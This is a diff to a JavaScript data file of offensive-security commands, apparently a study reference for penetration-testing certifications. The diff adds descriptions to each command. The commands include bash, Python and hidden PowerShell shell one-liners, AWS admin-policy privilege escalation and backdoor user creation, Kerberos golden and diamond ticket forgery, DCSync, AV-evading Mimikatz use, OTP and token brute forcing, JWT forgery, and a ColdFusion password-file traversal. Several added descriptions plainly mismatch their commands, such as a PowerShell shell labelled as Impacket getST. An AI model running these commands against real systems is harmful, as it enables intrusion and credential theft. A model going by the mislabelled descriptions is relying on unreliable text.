+          "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
         }
       ],
       "steps": [
@@ -9606,11 +9670,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "List all EC2 instances in the account",
-          "command": "aws --profile <profile> ec2 describe-instances"
+          "command": "aws --profile <profile> ec2 describe-instances",
+          "description": "Lists EC2 instances with their metadata. Shows instance IDs, IPs, security groups, IAM roles, and tags - essential for mapping the compute infrastructure."
         },
         {
           "label": "EC2 instances with public IPs only",
-          "command": "aws --profile <profile> ec2 describe-instances --query \"Reservations[].Instances[?PublicIpAddress].{Id:InstanceId,IP:PublicIpAddress,State:State.Name}\" --output table"
+          "command": "aws --profile <profile> ec2 describe-instances --query \"Reservations[].Instances[?PublicIpAddress].{Id:InstanceId,IP:PublicIpAddress,State:State.Name}\" --output table",
+          "description": "Lists EC2 instances with their metadata. Shows instance IDs, IPs, security groups, IAM roles, and tags - essential for mapping the compute infrastructure."
         }
       ],
       "notes": "S3 bucket ACLs: 'public' means s3:ListBucket is granted to AllUsers or AuthenticatedUsers. A 403 on aws s3 ls means the bucket exists but you lack permission (still confirms the bucket name). A NoSuchBucket error means it truly doesn't exist. EC2 AMIs: --executable-users all returns AMIs that are publicly available (Public=true). --executable-users self returns AMIs the current account owns and can launch. EBS snapshots with --executable-users all list publicly shared snapshots - attackers can create a volume from them and mount in their own account. describe-images with no filter returns thousands of results; always filter by name/description/keyword. Public AMIs may contain hard-coded credentials, SSH keys, or other sensitive data embedded in the image.",
@@ -10044,35 +10110,43 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "List all IAM users",
-          "command": "aws --profile <profile> iam list-users"
+          "command": "aws --profile <profile> iam list-users",
+          "description": "Lists all IAM users in the AWS account. Enumerates the user inventory for privilege analysis and identifying over-provisioned or service accounts."
         },
         {
           "label": "List all IAM roles",
-          "command": "aws --profile <profile> iam list-roles"
+          "command": "aws --profile <profile> iam list-roles",
+          "description": "Lists all IAM roles in the AWS account. Roles often have broader permissions than users and can be assumed for privilege escalation."
         },
         {
           "label": "List all IAM policies",
-          "command": "aws --profile <profile> iam list-policies --scope Local --only-attached"
+          "command": "aws --profile <profile> iam list-policies --scope Local --only-attached",
+          "description": "Lists IAM policies in the AWS account. Shows both AWS-managed and customer-created policies - custom policies often contain overly permissive rules."
         },
         {
           "label": "Get group members",
-          "command": "aws --profile <profile> iam get-group --group-name <group_name>"
+          "command": "aws --profile <profile> iam get-group --group-name <group_name>",
+          "description": "Executes an AWS CLI command for cloud infrastructure enumeration or exploitation."
         },
         {
           "label": "Get managed policy details",
-          "command": "aws --profile <profile> iam get-policy --policy-arn <policy_arn>"
+          "command": "aws --profile <profile> iam get-policy --policy-arn <policy_arn>",
+          "description": "Get managed policy details. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Scope a role's permissions (managed + inline)",
-          "command": "aws --profile <profile> iam list-attached-role-policies --role-name <role_name>\naws --profile <profile> iam list-role-policies --role-name <role_name>\naws --profile <profile> iam get-role-policy --role-name <role_name> --policy-name <policy_name>"
+          "command": "aws --profile <profile> iam list-attached-role-policies --role-name <role_name>\naws --profile <profile> iam list-role-policies --role-name <role_name>\naws --profile <profile> iam get-role-policy --role-name <role_name> --policy-name <policy_name>",
+          "description": "Lists policies attached to a specific IAM user, group, or role. Shows what permissions the entity has been granted through policy attachments."
         },
         {
           "label": "Read inline policy on a user / group",
-          "command": "aws --profile <profile> iam get-user-policy --user-name <user> --policy-name <policy_name>\naws --profile <profile> iam get-group-policy --group-name <group> --policy-name <policy_name>"
+          "command": "aws --profile <profile> iam get-user-policy --user-name <user> --policy-name <policy_name>\naws --profile <profile> iam get-group-policy --group-name <group> --policy-name <policy_name>",
+          "description": "Retrieves the full JSON document of an inline IAM policy on a user. Shows the exact permissions granted by the inline policy."
         },
         {
           "label": "List all managed policy versions",
-          "command": "aws --profile <profile> iam list-policy-versions --policy-arn <policy_arn>"
+          "command": "aws --profile <profile> iam list-policy-versions --policy-arn <policy_arn>",
+          "description": "Executes an AWS CLI command for cloud infrastructure enumeration or exploitation."
         }
       ],
       "notes": "IAM permissions can come from: (1) inline user policy, (2) managed policy directly attached to user, (3) group membership -> group inline or managed policies, (4) resource-based policies on services (S3, Lambda, etc.), (5) permission boundaries. Permission boundaries RESTRICT the maximum effective permissions - a boundary that allows only S3 means even if a policy grants EC2 access, the user cannot use EC2. Explicit Deny always overrides Allow regardless of source. AWS-managed policies (arn:aws:iam::aws:policy/) can be read via get-policy-version even by the subject user - they are public. Customer-managed policies (arn:aws:iam::<account_id>:policy/) require iam:GetPolicyVersion which may not be granted. Workaround: use get-account-authorization-details (see aws-iam-full-dump) if broader read permissions exist.",
@@ -10291,11 +10365,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Attach admin policy to a role (role-based privesc)",
-          "command": "aws --profile <profile> iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name <role_name>"
+          "command": "aws --profile <profile> iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name <role_name>",
+          "description": "Attach admin policy to a role (role-based privesc). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Create login profile (console password) for backdoor user",
-          "command": "aws --profile <profile> iam create-login-profile --user-name backdoor --password <password>"
+          "command": "aws --profile <profile> iam create-login-profile --user-name backdoor --password <password>",
+          "description": "Create login profile (console password) for backdoor user. See the command syntax for exact parameters and flags."
         }
       ],
       "notes": "The AdministratorAccess AWS managed policy ARN (arn:aws:iam::aws:policy/AdministratorAccess) is the same across all AWS accounts. This grants full access to all AWS services and resources. The SecretAccessKey is ONLY returned in the create-access-key response - AWS never shows it again. If lost, delete the access key and create a new one. Alternative: iam:CreateLoginProfile creates a console password (not access keys). Alternative: iam:PutUserPolicy / iam:AttachUserPolicy on a low-privilege existing user silently escalates without creating a new detectable user. CloudTrail logs all IAM API calls - iam:CreateUser, iam:AttachUserPolicy, and iam:CreateAccessKey appear in the audit trail. Defenders look for unusual iam:Create* calls, especially outside business hours or from unexpected source IPs.",
@@ -10751,19 +10827,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "set_keys (configure temp creds directly in Pacu)",
-          "command": "Pacu (offseclab:No Keys Set) > set_keys"
+          "command": "Pacu (offseclab:No Keys Set) > set_keys",
+          "description": "Set_keys (configure temp creds directly in Pacu). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Enumerate EC2 instances and view results",
-          "command": "Pacu (offseclab:imported-target) > run ec2__enum\nPacu (offseclab:imported-target) > data EC2"
+          "command": "Pacu (offseclab:imported-target) > run ec2__enum\nPacu (offseclab:imported-target) > data EC2",
+          "description": "Enumerate EC2 instances and view results. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Scan for IAM privilege escalation paths",
-          "command": "Pacu (offseclab:imported-target) > run iam__privesc_scan"
+          "command": "Pacu (offseclab:imported-target) > run iam__privesc_scan",
+          "description": "Scan for IAM privilege escalation paths. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Check current identity and permissions summary",
-          "command": "Pacu (offseclab:imported-target) > whoami"
+          "command": "Pacu (offseclab:imported-target) > whoami",
+          "description": "Check current identity and permissions summary. See the command syntax for exact parameters and flags."
         }
       ],
       "notes": "Pacu organizes data by AWS service (IAM, EC2, S3, etc.) in its SQLite database - use 'data IAM' or 'data EC2' to view collected data. Sessions persist across runs - re-running Pacu reconnects to the last session or you can activate a specific one with --activate-session. import_keys reads from the local ~/.aws/credentials file (aws configure profiles). The iam__enum_roles module works cross-account by attempting to update the AssumeRole trust policy of a role you control - if a role exists in the target account, the update succeeds. iam__enum_permissions uses a brute-force approach calling hundreds of AWS APIs and tracking which succeed vs. return AccessDenied. iam__bruteforce_permissions is a more aggressive alternative for permission discovery. Useful Pacu modules for Ch24-25: iam__enum_*, ec2__enum, s3__*, lambda__enum, rds__enum, ebs__enum_volumes_snapshots.",
@@ -11633,11 +11713,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Configure stolen short-term (STS) credentials manually",
-          "command": "aws configure set aws_access_key_id <key_id> --profile <profile>\naws configure set aws_secret_access_key <secret> --profile <profile>\naws configure set aws_session_token <token> --profile <profile>\naws sts get-caller-identity --profile <profile>"
+          "command": "aws configure set aws_access_key_id <key_id> --profile <profile>\naws configure set aws_secret_access_key <secret> --profile <profile>\naws configure set aws_session_token <token> --profile <profile>\naws sts get-caller-identity --profile <profile>",
+          "description": "Checks which AWS identity (user, role, or assumed role) the current credentials belong to. First command to run with compromised AWS keys to understand what you have access to."
         },
         {
           "label": "Stored credentials file location",
-          "command": "# Windows: C:\\Users\\<user>\\.aws\\credentials\n# Linux: /home/<user>/.aws/credentials\ncat ~/.aws/credentials"
+          "command": "# Windows: C:\\Users\\<user>\\.aws\\credentials\n# Linux: /home/<user>/.aws/credentials\ncat ~/.aws/credentials",
+          "description": "Stored credentials file location. See the command syntax for exact parameters and flags."
         }
       ],
       "notes": "Access Key IDs starting with AKIA are long-term credentials (IAM user keys). AKIDs starting with ASIA are temporary STS credentials (from AssumeRole or instance metadata). The account ID is 12 digits and appears in the ARN as the 5th colon-separated segment: arn:aws:iam::<account_id>:user/<name>. sts get-access-key-info only requires a valid AWS profile (even your own attacker account) and returns the account ID the target AKID belongs to - useful for mapping which company/account a leaked key came from. Credentials are stored in ~/.aws/credentials (keys) and ~/.aws/config (region/output). Multiple profiles can coexist; switch with --profile.",
@@ -12418,23 +12500,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "List all VMs in the subscription",
-          "command": "az vm list -o table"
+          "command": "az vm list -o table",
+          "description": "Enumerates Azure virtual machines and their configuration. Shows instance metadata, managed identities, and network settings for targeting."
         },
         {
           "label": "Get VM public IP address",
-          "command": "az vm list-ip-addresses --name <vm_name> --resource-group <rg_name> -o table"
+          "command": "az vm list-ip-addresses --name <vm_name> --resource-group <rg_name> -o table",
+          "description": "Enumerates Azure virtual machines and their configuration. Shows instance metadata, managed identities, and network settings for targeting."
         },
         {
           "label": "Role assignments in a specific subscription",
-          "command": "az role assignment list --subscription <subscription_id_or_name>"
+          "command": "az role assignment list --subscription <subscription_id_or_name>",
+          "description": "Lists Azure role assignments (RBAC). Shows which identities have what permissions on which resources - essential for identifying over-privileged accounts."
         },
         {
           "label": "All role assignments (current subscription + inherited)",
-          "command": "az role assignment list --all"
+          "command": "az role assignment list --all",
+          "description": "Lists Azure role assignments (RBAC). Shows which identities have what permissions on which resources - essential for identifying over-privileged accounts."
         },
         {
           "label": "Subscription detail by ID or name",
-          "command": "az account show -s <subscription_id_or_name>"
+          "command": "az account show -s <subscription_id_or_name>",
+          "description": "Subscription detail by ID or name. See the command syntax for exact parameters and flags."
         }
       ],
       "notes": "ARM hierarchy: Tenant -> Management Group -> Subscription -> Resource Group -> Resource; RBAC role assignments inherit top-down. Built-in roles: Owner (full + can assign roles), Contributor (full but NOT role assignment), Reader (read-only), plus custom roles. Hunt for: your principal's assignments (--assignee), custom roles with dangerous actions, and Owner / User Access Administrator to escalate by assigning yourself a role. ARM REST base: https://management.azure.com/{version}/{resource}?{query}.",
@@ -13072,11 +13159,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Linux -> Windows",
-          "command": "# linux: cat id_rsa | base64 -w 0; echo ; md5sum id_rsa\n# windows: [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"<base64>\"))\nGet-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5"
+          "command": "# linux: cat id_rsa | base64 -w 0; echo ; md5sum id_rsa\n# windows: [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"<base64>\"))\nGet-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5",
+          "description": "Transfers a file between Linux and Windows by encoding it as base64 text. Encodes on the source, copies the text, decodes on the destination - works through any channel that passes text (RDP clipboard, web shell, etc.)."
         },
         {
           "label": "Windows -> Linux",
-          "command": "# windows: [Convert]::ToBase64String((Get-Content -Path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\nGet-FileHash \"C:\\...\\hosts\" -Algorithm MD5\n# linux: echo <base64> | base64 -d > hosts ; md5sum hosts"
+          "command": "# windows: [Convert]::ToBase64String((Get-Content -Path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\nGet-FileHash \"C:\\...\\hosts\" -Algorithm MD5\n# linux: echo <base64> | base64 -d > hosts ; md5sum hosts",
+          "description": "Reads the hosts file for custom hostname-to-IP mappings. Reveals internal hostnames, development servers, and network topology that DNS queries might not show."
         }
       ],
       "opsec": "quiet",
@@ -13705,15 +13794,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Linux bash",
-          "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f"
+          "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f",
+          "description": "Bash reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "Python",
-          "command": "python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
+          "command": "python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
+          "description": "Python reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "Windows PowerShell",
-          "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"
+          "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();",
+          "description": "Uses Impacket getST to request a Kerberos Service Ticket (TGS) for a specific SPN. Used in constrained delegation attacks, S4U abuse, and service ticket manipulation."
         }
       ],
       "opsec": "loud",
@@ -14069,19 +14161,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SharpHound CE (Community Edition)",
-          "command": "SharpHound.exe --collectionmethods All"
+          "command": "SharpHound.exe --collectionmethods All",
+          "description": "Runs SharpHound collector to gather Active Directory data for BloodHound analysis. Collects user sessions, group memberships, ACLs, and trust relationships - the dataset that powers attack path analysis."
         },
         {
           "label": "SharpHound Legacy",
-          "command": "SharpHound.exe --collectionmethods All"
+          "command": "SharpHound.exe --collectionmethods All",
+          "description": "Runs SharpHound collector to gather Active Directory data for BloodHound analysis. Collects user sessions, group memberships, ACLs, and trust relationships - the dataset that powers attack path analysis."
         },
         {
           "label": "SOAPHound - build cache (ADWS, stealthy)",
-          "command": "SOAPHound.exe --buildcache -c <cache_file>"
+          "command": "SOAPHound.exe --buildcache -c <cache_file>",
+          "description": "SOAPHound - build cache (ADWS, stealthy). See the command syntax for exact parameters and flags."
         },
         {
           "label": "SOAPHound - dump BloodHound data",
-          "command": "SOAPHound.exe -c <cache_file> --bhdump -o <output_dir> --nolaps"
+          "command": "SOAPHound.exe -c <cache_file> --bhdump -o <output_dir> --nolaps",
+          "description": "SOAPHound - dump BloodHound data. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Runs the SharpHound collector to gather AD relationship data for BloodHound path analysis:\n  Invoke-BloodHound       the SharpHound.ps1 collection function\n  -CollectionMethod All   collect sessions, ACLs, group membership, trusts, delegation, etc.\n  -OutputDirectory C:\\Temp\\   where to drop the zip\n  -OutputPrefix 'crtp'    prefix for the output files\nImport the resulting zip into BloodHound to see shortest paths to Domain Admin, unconstrained hosts, and ACL abuse edges."
@@ -14316,7 +14412,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Reset neo4j password on first run",
-          "command": "# browse http://localhost:7474  (neo4j/neo4j -> set new)"
+          "command": "# browse http://localhost:7474  (neo4j/neo4j -> set new)",
+          "description": "Reset neo4j password on first run. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Starts the graph backend and BloodHound GUI:\n  sudo neo4j start   launch the Neo4j database BloodHound stores its graph in\n  bloodhound         open the analysis GUI\nNeo4j must be up first (default creds neo4j/neo4j, changed on first login at http://localhost:7474); then drag your SharpHound/bloodhound-python ZIP into the GUI and run the pre-built queries to find paths to DA."
@@ -14534,11 +14631,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Kerberos auth (ccache)",
-          "command": "bloodhound-python -k -no-pass -ns <dc_ip> -d <domain> -c All --zip"
+          "command": "bloodhound-python -k -no-pass -ns <dc_ip> -d <domain> -c All --zip",
+          "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
         },
         {
           "label": "Target a specific collection method",
-          "command": "bloodhound-python -u '<user>' -p '<password>' -ns <dc_ip> -d <domain> -c DCOnly"
+          "command": "bloodhound-python -u '<user>' -p '<password>' -ns <dc_ip> -d <domain> -c DCOnly",
+          "description": "Runs the Python BloodHound collector with a specific collection method (e.g., Group, Session, ACL, ObjectProps). Targeted collection reduces noise and time compared to collecting everything."
         }
       ],
       "steps": [
@@ -14683,7 +14782,8 @@ const COMMAND_DATA = {
         {
           "command": "curl -X POST http://<target>/api/v1/authentication/customers/passwords/resets/email-otps -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\"}'\nffuf -u http://<target>/api/v1/authentication/customers/passwords/resets -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\", \"OTP\": \"FUZZ\", \"NewPassword\": \"<new_pass>\"}' -w <(seq -w 0000 9999):FUZZ -t 50 -mr '\"SuccessStatus\":true'",
           "caption": "API OTP bruteforce: trigger email reset then immediately fuzz 4-digit OTP with seq (race condition window)",
-          "label": "POST request"
+          "label": "POST request",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         }
       ],
       "defense": {
@@ -15153,7 +15253,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Tamper role/user in the body/cookie",
-          "command": "# change user_id / role=admin / isAdmin=true in request"
+          "command": "# change user_id / role=admin / isAdmin=true in request",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Escalate privileges or impersonate another user by tampering an identity parameter (user_id, role, isAdmin) that the server trusts without re-authorising against the session.:\n  GET /admin.php?user_id=<admin_id> HTTP/1.1\nThe flaw is authorisation drift: the app authenticates the session but then reads identity/role from a request parameter instead of the session, so changing user_id or role=admin acts as someone else."
@@ -15409,11 +15510,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Flip a base64/JSON role claim",
-          "command": "echo -n '{\"user\":\"x\",\"role\":\"admin\"}' | base64"
+          "command": "echo -n '{\"user\":\"x\",\"role\":\"admin\"}' | base64",
+          "description": "Flip a base64/JSON role claim. See the command syntax for exact parameters and flags."
         },
         {
           "label": "JWT alg:none",
-          "command": "# set header alg to none, strip signature, set admin claim"
+          "command": "# set header alg to none, strip signature, set admin claim",
+          "description": "Forges a JWT token by setting the algorithm to \"none\" and removing the signature. Exploits servers that accept unsigned tokens - bypasses authentication by crafting arbitrary claims."
         }
       ],
       "steps": [
@@ -15801,7 +15904,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Short numeric token",
-          "command": "ffuf -w <wordlist> -u 'http://<target>/reset?token=FUZZ' -fr 'invalid'"
+          "command": "ffuf -w <wordlist> -u 'http://<target>/reset?token=FUZZ' -fr 'invalid'",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Brute-force a short/predictable password-reset token (e.g. a 4-digit numeric code) to take over an account whose reset was initiated.:\n  -w <wordlist>            wordlist file\n  -u http://<target>/reset_password.php?token=FUZZusername / user to authenticate as\n  <wordlist>               path to wordlist file\n  <target>                 target host\nFirst trigger a reset for the target account so a valid token exists server-side, then brute the token space."
@@ -16212,7 +16316,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Filter on the 'user exists' response diff",
-          "command": "ffuf -w <userlist> -u http://<target>/login -X POST -d 'user=FUZZ&pass=x' -fr 'no such user'"
+          "command": "ffuf -w <userlist> -u http://<target>/login -X POST -d 'user=FUZZ&pass=x' -fr 'no such user'",
+          "description": "Filter on the 'user exists' response diff. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Enumerate valid usernames by abusing a login form that returns different error messages for unknown users vs wrong passwords ('Unknown user' vs 'Invalid password').:\n  -w <userlist>            wordlist file\n  -u http://<target>/index.phpusername / user to authenticate as\n  -H Content-Type: application/x-www-form-urlencodedNTLM hash for pass-the-hash\n  -d username=FUZZ&password=invaliddomain name\n  <target>                 target host\nThe vulnerability is the app leaking which half of the credential pair was wrong."
@@ -17958,11 +18063,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Include words containing numbers",
-          "command": "cewl <url> -d <depth> -m <min_length> --with-numbers -w wordlist.txt"
+          "command": "cewl <url> -d <depth> -m <min_length> --with-numbers -w wordlist.txt",
+          "description": "Include words containing numbers. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Harvest emails from the site",
-          "command": "cewl <url> -d <depth> -e --email_file emails.txt -w wordlist.txt"
+          "command": "cewl <url> -d <depth> -e --email_file emails.txt -w wordlist.txt",
+          "description": "Harvest emails from the site. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Builds a target-specific wordlist by crawling their website:\n  cewl <url>               spider this site\n  -d <depth>               crawl to this link depth\n  -m <min_length>          keep words at least this long\n  --lowercase              lowercase the output\n  -w wordlist.txt          save the harvested words\nGreat for org-specific candidates generic lists miss; --with-numbers keeps numeric words, -e also harvests emails."
@@ -18403,27 +18510,33 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Alt method (LO18): dump inter-realm TRUST KEY",
-          "command": "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'   # note the [In] key for the parent domain"
+          "command": "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'   # note the [In] key for the parent domain",
+          "description": "Runs Mimikatz operations via reflective PowerShell loading - executes entirely in memory without writing to disk."
         },
         {
           "label": "Forge referral TGT with the trust key + parent EA SID",
-          "command": "Rubeus.exe golden /rc4:<trust_key> /domain:<child_domain> /sid:<child_sid> /sids:<parent_EA_sid> /user:Administrator /service:krbtgt /target:<parent_domain> /nowrap"
+          "command": "Rubeus.exe golden /rc4:<trust_key> /domain:<child_domain> /sid:<child_sid> /sids:<parent_EA_sid> /user:Administrator /service:krbtgt /target:<parent_domain> /nowrap",
+          "description": "Forge referral TGT with the trust key + parent EA SID. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Request a parent-domain TGS with the forged ticket",
-          "command": "Rubeus.exe asktgs /ticket:<forged_tgt> /service:cifs/<parent_dc> /dc:<parent_dc> /ptt"
+          "command": "Rubeus.exe asktgs /ticket:<forged_tgt> /service:cifs/<parent_dc> /dc:<parent_dc> /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "DC-identity OPSEC golden (extra SIDs -516, S-1-5-9)",
-          "command": "Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_sid>-516,S-1-5-9 /user:dcorp-dc$ /id:1000 /ptt"
+          "command": "Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_sid>-516,S-1-5-9 /user:dcorp-dc$ /id:1000 /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "Diamond ticket cross-trust (/sids)",
-          "command": "Rubeus.exe diamond /krbkey:<child_krbtgt_aes> /user:Administrator /domain:<child_domain> /sids:<parent_EA_sid> /enctype:aes /ptt"
+          "command": "Rubeus.exe diamond /krbkey:<child_krbtgt_aes> /user:Administrator /domain:<child_domain> /sids:<parent_EA_sid> /enctype:aes /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "DCSync parent forest root after escalation",
-          "command": "SafetyKatz.exe \"lsadump::dcsync /user:<parent_domain>\\krbtgt /domain:<parent_domain>\" \"exit\""
+          "command": "SafetyKatz.exe \"lsadump::dcsync /user:<parent_domain>\\krbtgt /domain:<parent_domain>\" \"exit\"",
+          "description": "Performs DCSync by simulating a domain controller replication request (DRSUAPI). Extracts password hashes for any account from the DC without running code on it - requires DA or replication privileges."
         }
       ],
       "explain": "Forges a cross-domain golden ticket that escalates from a child domain to the forest root:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>            the child domain's krbtgt hash (from DCSync)\n  /domain:<domain> /sid:<domain_sid>   the child domain and its SID\n  /sids:<parent_enterprise_admin_sid>  the parent Enterprise Admins SID (ends -519) injected into SID History\n  /user:Administrator /ptt  impersonate Administrator and inject the ticket\nSID History is not filtered inside a forest, so the ticket is honored on the parent DC - dir \\\\<parent_dc>\\C$ then DCSync the root."
@@ -18524,15 +18637,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Forward - Client (attacker)",
-          "command": "./chisel client -v <pivot_ip>:<port> socks"
+          "command": "./chisel client -v <pivot_ip>:<port> socks",
+          "description": "Connects a Chisel client from the target back to your server, establishing a reverse tunnel. Creates a SOCKS proxy or port forward for reaching internal networks from your attack machine."
         },
         {
           "label": "Reverse - Server (attacker)",
-          "command": "sudo ./chisel server --reverse -v -p <port> --socks5"
+          "command": "sudo ./chisel server --reverse -v -p <port> --socks5",
+          "description": "Starts a Chisel tunnel server. The client on the target connects back through this server to create a SOCKS proxy or port forward for pivoting through the compromised host."
         },
         {
           "label": "Reverse - Client (pivot)",
-          "command": "./chisel client -v <attacker_ip>:<port> R:socks"
+          "command": "./chisel client -v <attacker_ip>:<port> R:socks",
+          "description": "Connects a Chisel client from the target back to your server, establishing a reverse tunnel. Creates a SOCKS proxy or port forward for reaching internal networks from your attack machine."
         }
       ],
       "opsec": "quiet",
@@ -18746,7 +18862,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Passive: read metadata from a document the target sent you",
-          "command": "exiftool -a -u <document>"
+          "command": "exiftool -a -u <document>",
+          "description": "Passive: read metadata from a document the target sent you. See the command syntax for exact parameters and flags."
         }
       ],
       "examples": [
@@ -18970,11 +19087,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Google dork - AWS S3",
-          "command": "intext:<company_name> inurl:amazonaws.com"
+          "command": "intext:<company_name> inurl:amazonaws.com",
+          "description": "Google dorking query for OSINT reconnaissance. Uses advanced search operators to find exposed documents, login pages, sensitive files, and information leaks indexed by search engines."
         },
         {
           "label": "Google dork - Azure Blob",
-          "command": "intext:<company_name> inurl:blob.core.windows.net"
+          "command": "intext:<company_name> inurl:blob.core.windows.net",
+          "description": "Google dorking query for OSINT reconnaissance. Uses advanced search operators to find exposed documents, login pages, sensitive files, and information leaks indexed by search engines."
         }
       ],
       "opsec": "silent",
@@ -19455,7 +19574,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Manual traversal via the vulnerable locale parameter (no script)",
-          "command": "curl \"http://<ip>:<port>/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties\""
+          "command": "curl \"http://<ip>:<port>/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties\"",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         }
       ],
       "examples": [
@@ -19850,7 +19970,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Vulnerable FCKeditor upload endpoint (manual confirmation)",
